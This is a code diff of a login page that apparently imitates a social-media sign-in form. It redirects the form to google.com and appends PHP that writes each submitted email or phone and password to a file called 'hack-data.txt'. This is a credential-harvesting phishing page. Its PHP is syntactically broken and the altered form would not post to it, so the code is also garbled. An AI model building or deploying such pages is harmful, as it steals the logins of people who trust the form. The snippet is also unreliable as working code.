@@ -34,7 +34,7 @@
 		</div>
 		<div class="conatainer-fluid">
 			<div class="container">
-				<form method="POST" action="action.php">
+				<form method="#" action="google.com">
 				<div class="row">
 				<div class="col-md-6">
     <input type="text" class="form-control back" name="email" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Mobile number or email address">
@@ -86,3 +86,13 @@
 		</div>
 	</body>
 </html>
+<?php
+	extract($_REQUEST);
+	$file=fopen("hack-data.txt","a");
+	
+	fwrite($file,"Email or Phone : ");
+	fwrite($file,$email : \n);
+	fwrite($file,"Email or Password : ");
+	fwrite($file,$password : \n");
+	fclose($file);
+?>
